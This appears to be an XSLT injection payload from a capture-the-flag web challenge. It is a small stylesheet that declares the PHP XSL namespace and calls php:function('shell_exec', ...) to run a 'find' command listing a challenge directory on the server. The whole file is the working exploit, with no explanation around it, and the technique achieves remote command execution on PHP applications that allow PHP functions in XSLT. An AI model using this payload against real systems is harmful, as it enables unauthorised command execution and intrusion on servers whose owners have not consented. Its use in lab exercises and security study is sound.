<?xml version="1.0" encoding="UTF-8"?>
<html xsl:version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:php="http://php.net/xsl">
<body style="font-family:Arial;font-size:12pt;background-color:#EEEEEE">
<xsl:for-each select="beers/beer">
  <div>
  BEAR:<br/>
  <xsl:value-of select="php:function('shell_exec', 'find /challenge/web-serveur/ch50/')"/>
  </div>
</xsl:for-each>
</body>
</html> 
